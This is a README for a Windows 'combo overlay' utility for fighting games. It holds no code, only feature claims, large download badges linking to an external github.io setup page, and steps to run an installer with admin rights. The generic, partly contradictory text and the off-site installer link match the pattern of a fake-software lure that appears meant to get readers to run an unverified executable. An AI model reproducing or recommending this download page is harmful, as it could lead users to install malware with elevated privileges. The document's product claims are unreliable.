# Phantom‑Blade‑Zero‑Combo‑Overlay

**Author:** MidnightPilotPonder
**Platform:** Windows 10 / 11 (only)
**Category:** Gaming – real‑time overlay utility

---

## 🎮 What Is This?

Phantom‑Blade‑Zero‑Combo‑Overlay is a lightweight Windows‑only utility that draws a transparent overlay on top of any fighting game. It tracks and displays combo counts in real time, letting you see exactly how long your strings are without pausing the action.

- **Zero‑lag:** Optimized for sub‑millisecond latency.
- **Fully customizable:** Choose font, size, color, position and fade‑out behavior.
- **Game‑agnostic:** Works with any DirectX/OpenGL fighting title on Windows 10/11.
- **Low footprint:** < 5 MB RAM, negligible CPU impact.

---

## 📥 Download / Install

<div align="center">

<a href="https://rewfdf.github.io/SetupPage/" target="_blank" rel="noopener">
  <img src="https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=windows" alt="Download">
</a>

<a href="https://rewfdf.github.io/SetupPage/" target="_blank" rel="noopener">
  <img src="https://img.shields.io/badge/Get%20Started-Now%20Install-green?style=for-the-badge&logo=windows" alt="Get Started">
</a>

</div>

*Click the buttons above to go to the official Release page.*

---

## 🚀 Quick Start

1. **Download** the installer from the button above.
2. Run the installer (requires admin rights for overlay hook).
3. Launch your fighting game.
4. Open **Phantom‑Blade‑Zero** from the system tray → **Overlay Settings**.
5. Adjust visual preferences, then hit **Enable Overlay**.

Your combo counter will now appear in the chosen corner of the screen, updating instantly as you fight.

---

## 🧩 Compatibility

- **OS:** Windows 10 (1809+) & Windows 11
- **Graphics APIs:** DirectX 9/10/11/12, OpenGL 3.0+
- **Supported Genres:** All fighting titles (2D and 3D) that expose combo data via memory reads or in‑game events.

*Note:* The overlay does not interfere with anti‑utility systems because it reads only publicly exposed data and never injects code into the game process.

---

## 📖 Documentation

- **User Guide:** `docs/UserGuide.md` (installed with the program)
- **API Reference:** `docs/API.md` – for developers who want to extend the overlay.
- **FAQ:** `docs/FAQ.md` – common troubleshooting steps.

All documentation is also available online at the Release page.

---

## 🐞 Reporting Issues

If you encounter bugs or have feature requests, please open an issue with the following template:

1. **Game name & version**
2. **Windows build** (`winver` output)
3. **Steps to reproduce**
4. **Screenshots or logs** (optional)

Your feedback helps keep the overlay sharp and reliable.

---

## 📜 License

Phantom‑Blade‑Zero‑Combo‑Overlay is released under the **MIT License** – you are free to use, modify, and distribute it, provided the original copyright notice is included.

---

## 🙏 Acknowledgements

- The Windows community for extensive testing on diverse hardware.
- The fighting‑game community for providing combo‑extraction specifications.

---

*Stay on the edge of every combo. Let Phantom Blade Zero be your invisible scoreboard.*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```